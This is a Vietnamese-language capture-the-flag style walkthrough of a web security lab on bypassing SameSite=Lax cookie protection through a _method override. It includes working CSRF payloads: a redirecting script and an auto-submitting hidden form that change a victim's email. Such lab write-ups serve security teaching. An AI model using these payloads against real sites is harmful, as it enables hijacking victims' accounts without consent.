@@ -1,0 +1,44 @@
+CSRF - SameSite Lax bypass via method override
+
+End Goal: To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.
+You can log in to your own account using the following credentials: wiener:peter
+
+Analystic
+---------
+* Nghiên cứu chức năng đổi email
+Trong trình duyệt Burp, đăng nhập vào tài khoản và thực hiện thay đổi email
+Sau đó vào history tìm request ta được request như sau:
+POST /my-account/change-email HTTP/2
+Host: 0a1d00d70316f1d880eb7691007d0083.web-security-academy.net
+Cookie: session=yyFkjGFvtD1twHVhHRHrmNwS36AsIsU9
+.......
+email=123%40gmail.com
+Có thể thấy trong cookie không hề có csrf và trong giá trị gửi đi cũng k hề có csrf --> chỉ dựa vào sessionId để thực hiện xác thực hay hạn chế. Như cái bài trước trong phần Set-Cookie, ta có đặt SameSite=None để web có thể gửi sessionId cho bất kì request từ bên thứ 3 nào. Tuy nhiên ở bài này ta không có phần Search như những lab trước nên ta không thể chèn giá trị vào. 
+Quay lại xem response cho phần /login, ta thấy khi đăng nhập vào, web không yêu cầu gì để tạo phiên, cũng không thấy phần SameSite ở đây --> nó được đặt mặc định là Lax. Mà Lax thì có lỗ hổng là những yêu cầu có method là GET vẫn sẽ được gửi sessionId, vậy nên ta sẽ muốn thực hiện 1 GET request từ 1 miền mà ta kiểm soát tời trang. Tuy nhiên khi gửi request gốc tới repeater và đổi method thành GET ta nhận được thông báo method not Allowed. 
+
+* Bỏ qua các hạn chế của SameSite
+Lúc này ta sẽ thực hiện 1 request với method = GET, tuy nhiên sử dụng tham số _method để ghi đè nó thành POST, ta sẽ có URL như sau:
+GET /my-account/change-email?email=foo%40web-security-academy.net&_method=POST HTTP/1.1
+Sau khi gửi request đi, ta thấy không có lỗi và thử refersh lại trang, ta thấy email đã được thay đổi
+
+* Tạo khai thác
+Trong phần Nội dung, hãy tạo một tải trọng HTML/JavaScript khiến trình duyệt của người xem gửi yêu cầu GET độc hại. Hãy nhớ rằng điều này phải gây ra điều hướng cấp cao nhất để cookie phiên được bao gồm. Sau đây là một cách tiếp cận khả thi:
+<script>
+document.location = "https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&_method=POST";
+</script>
+Lưu trữ và tự xem khai thác. Xác nhận rằng điều này đã thay đổi thành công địa chỉ email của bạn trên trang web mục tiêu.
+Thay đổi địa chỉ email trong khai thác của bạn để nó không khớp với địa chỉ email của bạn.
+Gửi khai thác cho nạn nhân để giải quyết phòng thí nghiệm.
+hoặc có cách khác là:
+<html>
+	<body>
+	<script>history.pushState('','','/')</script>
+		<form action="https://0a03007903684dc2838e4612004e0012.web-security-academy.net/my-account/change-email" method="GET">
+			<input type="hidden" name="_method" value="POST">
+			<input type="hidden" name="email" value="is-me@gmail.com">
+		</form>
+	<script>
+		document.forms[0].submit();
+	</script>
+	</body>
+</html>
